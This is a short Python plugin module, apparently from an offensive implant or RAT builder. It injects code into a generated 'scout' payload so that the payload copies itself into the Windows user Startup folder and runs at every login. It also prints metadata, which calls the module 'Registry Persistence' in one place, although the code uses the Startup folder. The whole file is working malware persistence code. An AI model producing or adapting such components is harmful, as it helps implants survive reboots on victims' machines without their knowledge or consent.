# API
# done


def main(self, option):
    if option == 'generate':
        self.config.import_statements.append('from shutil import copy')
        self.config.import_statements.append('from os import path, getcwd')
        self.config.import_statements.append('from sys import argv')
        self.config.import_statements.append('from getpass import getuser')
        self.config.startup.append('startup_persist_startup(path.join(getcwd(),path.abspath(argv[0])))')
        self.config.functions.append('''
def startup_persist_startup(filepath):
        copy(filepath, 'C:\\\\Users\\\\' + getuser() + '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\' + path.basename(argv[0]))
''')
    elif option == 'info':
        self.log.blank('\nName             : Registry Persistence startup component' \
                       '\nOS               : Windows' \
                       '\nRequired Modules : shutil, sys, os' \
                       '\nCommands         : NIL (Runs at startup)' \
                       '\nDescription      : This module copies the scout to the windows startup folder\n')
        return {
            "Name": "Startup Persistence startup component",
            "OS": "Windows",
            "Required Modules": "shutil, sys, os",
            "Commands": "NIL (Runs at startup)",
            "Description": "This module copies the scout to the windows startup folder"}